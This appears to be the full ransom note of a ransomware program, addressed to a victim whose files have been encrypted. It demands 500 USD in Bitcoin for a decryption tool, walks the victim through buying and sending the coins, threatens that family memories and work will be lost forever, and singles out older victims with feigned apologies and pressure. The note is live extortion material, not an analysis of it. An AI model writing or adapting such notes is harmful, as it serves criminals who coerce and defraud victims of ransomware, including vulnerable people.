First of all we are terribly sorry to have encrypted your data. Because we are human too and we feel some guilt encrypting your data. We offer that we can help you decrypt it again for a small amount of Bitcoins(BTC). 
The amount that we need from you is 500 USD that you will transfer to our BTC account. To Get your unique tool to decrypt your files, your need to push the button below and your BTC payment address will show, transfer 500 USD in BTC to that address. 
After you have transfered the BTC you are going to send an email to our email address(Our email will also get displayed when pushed the button). Where you provide your BTC address of the wallet that you used to send our BTC(If you have other comments, you are welcome to say it)[Also remerber to check your spam inbox for when we send your decryption tool]. 
We will check it, if you have sent the BTC, you will get your decryption tool.                                                                                                    
Another thing to keep in mind is that, at some point you won't be able to get your data back again and it will be lost forever. 
Everything from family memories to the hard work of yours, will be washed down the toilet and it will never return. 
So it's strongly advised that you start paying us for helping you to decrypt it. In the case that you are a little older and don't know much about all the computer stuff then you can ask your children or grandchildren.
PLEASE Look below for additional information.

Needing help to get your BTC?
Some resources to get started with BTC:
https://coinsutra.com/buy-bitcoin-uk/
https://cryptocurrencytutors.com/getting-started-with-bitcoin/
https://blokt.com/guides/10-best-bitcoin-cryptocurrency-exchanges-2019-proven-safe-exchanges

Keep in mind! 
When you buy BTC you should buy slightly more than 500 USD, just in case the price drops. Also you need it as sending fees which varies at times. So it's recommended to buy 510 USD worth of BTC from one of the exchanges.
Then again we are sorry for what happened to you, hope you will have better luck next time! :)
